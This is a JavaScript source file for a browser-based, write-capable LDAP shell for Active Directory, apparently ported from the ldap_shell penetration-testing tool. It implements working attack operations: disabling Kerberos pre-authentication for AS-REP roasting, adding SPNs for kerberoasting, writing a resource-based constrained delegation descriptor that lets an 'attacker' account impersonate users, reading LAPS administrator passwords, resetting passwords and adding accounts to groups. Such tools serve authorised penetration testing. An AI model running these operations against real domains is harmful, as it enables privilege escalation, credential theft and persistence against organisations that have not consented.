// An interactive, write-capable LDAP shell for Active Directory — a browser
// port of the command set from PShlyundin/ldap_shell. Runs over the shared LDAP
// client (NTLM / Kerberos / simple auth, optional LDAPS + channel binding) and
// adds the AD operations: enumerate, create/delete objects, group membership,
// password reset, UAC flags (disable / AS-REP-roast), SPN (kerberoast), and
// resource-based constrained delegation.

import { SCOPE, filter as F } from './ldap/client.js';
import { tlv, octetString, concat as berConcat } from './ldap/ber.js';
import { bytesToSid } from './security/sid.js';

const dec = new TextDecoder();

// userAccountControl bits we toggle.
const UAC = { ACCOUNTDISABLE: 0x0002, NORMAL_ACCOUNT: 0x0200, WORKSTATION_TRUST: 0x1000, DONT_REQ_PREAUTH: 0x400000 };

// unicodePwd wire format: UTF-16LE of the password wrapped in double quotes.
function unicodePwd(pw) {
  const s = `"${pw}"`;
  const out = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); out[i * 2] = c & 0xff; out[i * 2 + 1] = (c >> 8) & 0xff; }
  return out;
}

// Self-relative SECURITY_DESCRIPTOR for msDS-AllowedToActOnBehalfOfOtherIdentity:
// owner BUILTIN\Administrators, DACL = one ACCESS_ALLOWED ACE (full control) for
// the attacker SID. (RBCD.)
function buildRbcdSd(attackerSid) {
  const owner = Uint8Array.of(0x01, 0x02, 0, 0, 0, 0, 0, 5, 0x20, 0, 0, 0, 0x24, 0x02, 0, 0); // S-1-5-32-544
  const ace = new Uint8Array(8 + attackerSid.length);
  const adv = new DataView(ace.buffer);
  ace[0] = 0x00; ace[1] = 0x00; adv.setUint16(2, ace.length, true); adv.setUint32(4, 0x000f01ff, true); // ACCESS_ALLOWED, full control
  ace.set(attackerSid, 8);
  const acl = new Uint8Array(8 + ace.length);
  const acv = new DataView(acl.buffer);
  acl[0] = 0x02; acv.setUint16(2, acl.length, true); acv.setUint16(4, 1, true); // rev 2, 1 ACE
  acl.set(ace, 8);
  const HDR = 20, offOwner = HDR + acl.length;
  const sd = new Uint8Array(offOwner + owner.length);
  const dv = new DataView(sd.buffer);
  sd[0] = 0x01; dv.setUint16(2, 0x8004, true); // rev 1, control = SELF_RELATIVE | DACL_PRESENT
  dv.setUint32(4, offOwner, true); dv.setUint32(16, HDR, true); // owner + dacl offsets (group/sacl = 0)
  sd.set(acl, HDR); sd.set(owner, offOwner);
  return sd;
}

// Minimal RFC 4515 filter string -> BER, for the `search` command.
function parseFilter(str) {
  const enc = new TextEncoder();
  let i = 0;
  const eat = (c) => { if (str[i] !== c) throw new Error(`bad filter at ${i}`); i++; };
  function parse() {
    eat('(');
    let node; const c = str[i];
    if (c === '&') { i++; node = F.and(...list()); }
    else if (c === '|') { i++; node = F.or(...list()); }
    else if (c === '!') { i++; node = tlv(0xa2, parse()); }
    else node = item();
    eat(')'); return node;
  }
  function list() { const s = []; while (str[i] === '(') s.push(parse()); return s; }
  function item() {
    let a = ''; while (i < str.length && str[i] !== '=' && str[i] !== ')') a += str[i++];
    eat('='); let v = ''; while (i < str.length && str[i] !== ')') v += str[i++];
    if (v === '*') return F.present(a);
    if (v.includes('*')) {
      const parts = v.split('*'); const ch = [];
      if (parts[0]) ch.push(tlv(0x80, enc.encode(parts[0])));
      for (let k = 1; k < parts.length - 1; k++) if (parts[k]) ch.push(tlv(0x81, enc.encode(parts[k])));
      if (parts[parts.length - 1]) ch.push(tlv(0x82, enc.encode(parts[parts.length - 1])));
      return tlv(0xa4, berConcat([octetString(a), tlv(0x30, berConcat(ch))]));
    }
    return F.equal(a, v);
  }
  return parse();
}

// Split a command line into tokens, honouring "double" and 'single' quotes.
function tokenize(line) {
  return (line.match(/"[^"]*"|'[^']*'|\S+/g) || []).map((t) => t.replace(/^["']|["']$/g, ''));
}

// Exposed for unit tests.
export const _internals = { unicodePwd, buildRbcdSd, parseFilter };

export class LdapShell {
  constructor(client, { baseDN, domain, tls = false, log = () => {} }) {
    this.client = client;
    this.baseDN = baseDN;
    this.domain = domain;
    this.tls = tls;
    this._log = log;
  }

  // ---- attribute helpers ----
  _key(e, name) { return Object.keys(e.attributes).find((k) => k.toLowerCase() === name.toLowerCase()); }
  _attr(e, name) { const k = this._key(e, name); return k ? dec.decode(e.attributes[k][0]) : null; }
  _attrRaw(e, name) { const k = this._key(e, name); return k ? e.attributes[k][0] : null; }
  _attrAll(e, name) { const k = this._key(e, name); return k ? e.attributes[k].map((v) => dec.decode(v)) : []; }

  // Resolve a DN or sAMAccountName to a single entry with the requested attrs.
  // Drains the search fully (no early break) so no SearchResultDone is left on
  // the wire to desync the write operation that follows.
  async _resolve(name, attrs = ['distinguishedName']) {
    const isDn = /^(CN|OU|DC)=/i.test(name);
    const opts = isDn
      ? { baseDN: name, scope: SCOPE.BASE, filter: F.present('objectClass'), attributes: attrs }
      : { baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: F.or(F.equal('sAMAccountName', name), F.equal('sAMAccountName', `${name}$`)), attributes: attrs };
    let found = null;
    for await (const e of this.client.search(opts)) { if (!found) found = e; }
    return found;
  }

  // Command names (for Tab completion / help).
  get commands() { return Object.keys(this._cmds).concat('exit'); }

  // ---- command dispatch ----
  async run(line) {
    const t = tokenize(line);
    if (!t.length) return '';
    const cmd = t[0].toLowerCase();
    const fn = this._cmds[cmd];
    if (!fn) return `Unknown command: ${cmd}. Type "help".`;
    return fn.call(this, t.slice(1));
  }

  get _cmds() {
    return {
      help: () => this.help(),
      whoami: () => this.client.whoami().then((s) => `[+] ${s}`),
      search: (a) => this.search(a[0], a[1]),
      dump: (a) => this.search(a[0] || '(objectClass=*)', a[1] || 'distinguishedName,objectClass,sAMAccountName'),
      get_object: (a) => this.getObject(a[0]),
      get_user_groups: (a) => this.getUserGroups(a[0]),
      get_group_members: (a) => this.getGroupMembers(a[0]),
      add_user: (a) => this.addUser(a[0], a[1]),
      add_computer: (a) => this.addComputer(a[0], a[1]),
      del: (a) => this.del(a[0]),
      add_user_to_group: (a) => this.groupMember(a[0], a[1], 'add'),
      del_user_from_group: (a) => this.groupMember(a[0], a[1], 'delete'),
      change_password: (a) => this.changePassword(a[0], a[1]),
      enable_account: (a) => this.toggleUac(a[0], UAC.ACCOUNTDISABLE, false, 'ACCOUNTDISABLE'),
      disable_account: (a) => this.toggleUac(a[0], UAC.ACCOUNTDISABLE, true, 'ACCOUNTDISABLE'),
      set_dontreqpreauth: (a) => this.toggleUac(a[0], UAC.DONT_REQ_PREAUTH, a[1] !== 'false' && a[1] !== '-', 'DONT_REQ_PREAUTH'),
      set_spn: (a) => this.setSpn(a[0], a[1]),
      clear_spn: (a) => this.setSpn(a[0], a[1], true),
      set_rbcd: (a) => this.setRbcd(a[0], a[1]),
      clear_rbcd: (a) => this.clearRbcd(a[0]),
      get_laps: (a) => this.getLaps(a[0]),
    };
  }

  help() {
    return [
      'Commands:',
      '  whoami                                  show the bound identity (LDAP Who Am I)',
      '  search <filter> [attr,attr]             raw LDAP search (subtree from base DN)',
      '  dump [filter] [attrs]                   search shortcut',
      '  get_object <name|dn>                    show all attributes of one object',
      '  get_user_groups <user>                  list a user\'s groups (memberOf)',
      '  get_group_members <group>               list a group\'s members',
      '  add_user <name> [password]              create a user (password needs LDAPS)',
      '  add_computer <name[$]> [password]       create a computer account',
      '  del <name|dn>                           delete an object',
      '  add_user_to_group <member> <group>      add a member to a group',
      '  del_user_from_group <member> <group>    remove a member from a group',
      '  change_password <target> <newpass>     reset a password (requires LDAPS)',
      '  enable_account / disable_account <name> toggle the account-disabled flag',
      '  set_dontreqpreauth <name> [true|false]  toggle DONT_REQ_PREAUTH (AS-REP roast)',
      '  set_spn <name> <spn> / clear_spn        add/remove a servicePrincipalName (kerberoast)',
      '  set_rbcd <target> <attacker> / clear_rbcd <target>   resource-based constrained delegation',
      '  get_laps <computer>                     read LAPS password attributes',
      '  help / exit',
    ].join('\n');
  }

  _format(e, attrs) {
    const lines = [e.dn];
    const names = attrs && attrs.length ? attrs : Object.keys(e.attributes);
    for (const a of names) {
      const k = this._key(e, a);
      if (!k) continue;
      const vals = e.attributes[k].map((v) => (/sid$/i.test(a) ? bytesToSid(v) : dec.decode(v)));
      lines.push(`    ${k}: ${vals.join(' | ')}`);
    }
    return lines.join('\n');
  }

  async search(filterStr, attrsStr) {
    const filt = filterStr ? parseFilter(filterStr) : F.present('objectClass');
    const attrs = attrsStr ? attrsStr.split(',') : [];
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: attrs })) {
      out.push(this._format(e, attrs));
      if (++n >= 200) { out.push('… (truncated at 200)'); break; }
    }
    return out.length ? `${out.join('\n\n')}\n\n[${n} object(s)]` : '(no results)';
  }

  async getObject(name) {
    const e = await this._resolve(name, []);
    if (!e) throw new Error(`object not found: ${name}`);
    return this._format(e, []);
  }

  async getUserGroups(name) {
    const e = await this._resolve(name, ['memberOf', 'primaryGroupID']);
    if (!e) throw new Error(`user not found: ${name}`);
    const groups = this._attrAll(e, 'memberOf');
    return groups.length ? `[+] ${name} is a member of:\n` + groups.map((g) => `    ${g}`).join('\n') : `[*] ${name} has no memberOf entries.`;
  }

  async getGroupMembers(name) {
    const e = await this._resolve(name, ['member']);
    if (!e) throw new Error(`group not found: ${name}`);
    const m = this._attrAll(e, 'member');
    return m.length ? `[+] ${name} members:\n` + m.map((x) => `    ${x}`).join('\n') : `[*] ${name} has no direct members.`;
  }

  async addUser(name, password) {
    if (!name) throw new Error('usage: add_user <name> [password]');
    const dn = `CN=${name},CN=Users,${this.baseDN}`;
    const canPwd = password && this.tls;
    const attrs = {
      objectClass: ['top', 'person', 'organizationalPerson', 'user'],
      sAMAccountName: [name],
      userAccountControl: [String(canPwd ? UAC.NORMAL_ACCOUNT : UAC.NORMAL_ACCOUNT | UAC.ACCOUNTDISABLE)],
    };
    if (canPwd) attrs.unicodePwd = [unicodePwd(password)];
    await this.client.add(dn, attrs);
    let msg = `[+] Created user ${dn}`;
    if (password && !this.tls) msg += '\n[!] Password NOT set (needs LDAPS) — account created disabled.';
    return msg;
  }

  async addComputer(name, password) {
    if (!name) throw new Error('usage: add_computer <name[$]> [password]');
    const sam = name.endsWith('$') ? name : `${name}$`;
    const cn = sam.slice(0, -1);
    const dn = `CN=${cn},CN=Computers,${this.baseDN}`;
    const canPwd = password && this.tls;
    const host = `${cn}.${this.domain}`.toLowerCase();
    const attrs = {
      objectClass: ['top', 'person', 'organizationalPerson', 'user', 'computer'],
      sAMAccountName: [sam],
      userAccountControl: [String(canPwd ? UAC.WORKSTATION_TRUST : UAC.WORKSTATION_TRUST | UAC.ACCOUNTDISABLE)],
      dNSHostName: [host],
      servicePrincipalName: [`HOST/${host}`, `HOST/${cn}`, `RestrictedKrbHost/${host}`, `RestrictedKrbHost/${cn}`],
    };
    if (canPwd) attrs.unicodePwd = [unicodePwd(password)];
    await this.client.add(dn, attrs);
    let msg = `[+] Created computer ${dn} (sAMAccountName ${sam})`;
    if (password && !this.tls) msg += '\n[!] Password NOT set (needs LDAPS) — account created disabled.';
    return msg;
  }

  async del(name) {
    const e = await this._resolve(name, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${name}`);
    await this.client.delete(e.dn);
    return `[+] Deleted ${e.dn}`;
  }

  async groupMember(member, group, op) {
    if (!member || !group) throw new Error('usage: add_user_to_group <member> <group>');
    const m = await this._resolve(member, ['distinguishedName']);
    if (!m) throw new Error(`member not found: ${member}`);
    const g = await this._resolve(group, ['distinguishedName']);
    if (!g) throw new Error(`group not found: ${group}`);
    await this.client.modify(g.dn, [{ op, type: 'member', values: [m.dn] }]);
    return `[+] ${op === 'add' ? 'Added' : 'Removed'} ${m.dn} ${op === 'add' ? 'to' : 'from'} ${g.dn}`;
  }

  async changePassword(target, newpass) {
    if (!this.tls) throw new Error('change_password requires LDAPS (unicodePwd can only be set over TLS). Reconnect with TLS.');
    if (!target || !newpass) throw new Error('usage: change_password <target> <newpassword>');
    const e = await this._resolve(target, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${target}`);
    await this.client.modify(e.dn, [{ op: 'replace', type: 'unicodePwd', values: [unicodePwd(newpass)] }]);
    return `[+] Password reset for ${e.dn}`;
  }

  async toggleUac(name, bit, on, label) {
    const e = await this._resolve(name, ['distinguishedName', 'userAccountControl']);
    if (!e) throw new Error(`object not found: ${name}`);
    let uac = parseInt(this._attr(e, 'userAccountControl') || '0', 10);
    uac = (on ? (uac | bit) : (uac & ~bit)) >>> 0;
    await this.client.modify(e.dn, [{ op: 'replace', type: 'userAccountControl', values: [String(uac)] }]);
    return `[+] ${label} ${on ? 'set' : 'cleared'} on ${e.dn} (userAccountControl=0x${uac.toString(16)})`;
  }

  async setSpn(name, spn, clear = false) {
    if (!name || !spn) throw new Error('usage: set_spn <name> <spn>');
    const e = await this._resolve(name, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${name}`);
    await this.client.modify(e.dn, [{ op: clear ? 'delete' : 'add', type: 'servicePrincipalName', values: [spn] }]);
    return `[+] ${clear ? 'Removed' : 'Added'} SPN ${spn} ${clear ? 'from' : 'to'} ${e.dn}`;
  }

  async setRbcd(target, attacker) {
    if (!target || !attacker) throw new Error('usage: set_rbcd <target-computer> <attacker-account>');
    const a = await this._resolve(attacker, ['distinguishedName', 'objectSid']);
    if (!a) throw new Error(`attacker not found: ${attacker}`);
    const sid = this._attrRaw(a, 'objectSid');
    if (!sid) throw new Error('could not read attacker objectSid');
    const t = await this._resolve(target, ['distinguishedName']);
    if (!t) throw new Error(`target not found: ${target}`);
    await this.client.modify(t.dn, [{ op: 'replace', type: 'msDS-AllowedToActOnBehalfOfOtherIdentity', values: [buildRbcdSd(sid)] }]);
    return `[+] RBCD configured on ${t.dn}: ${bytesToSid(sid)} (${attacker}) may impersonate users to it`;
  }

  async clearRbcd(target) {
    const t = await this._resolve(target, ['distinguishedName']);
    if (!t) throw new Error(`target not found: ${target}`);
    await this.client.modify(t.dn, [{ op: 'delete', type: 'msDS-AllowedToActOnBehalfOfOtherIdentity', values: [] }]);
    return `[+] Cleared RBCD on ${t.dn}`;
  }

  async getLaps(name) {
    const e = await this._resolve(name, ['ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime', 'msLAPS-Password', 'msLAPS-EncryptedPassword', 'msLAPS-PasswordExpirationTime']);
    if (!e) throw new Error(`computer not found: ${name}`);
    const legacy = this._attr(e, 'ms-Mcs-AdmPwd');
    const winLaps = this._attr(e, 'msLAPS-Password');
    if (legacy) return `[+] LAPS (legacy) password for ${name}: ${legacy}`;
    if (winLaps) return `[+] Windows LAPS for ${name}: ${winLaps}`;
    if (this._key(e, 'msLAPS-EncryptedPassword')) return `[*] ${name} has an *encrypted* LAPS password (DPAPI-NG); decryption not supported here.`;
    return `[*] No readable LAPS password on ${name} (not configured, or no permission).`;
  }
}
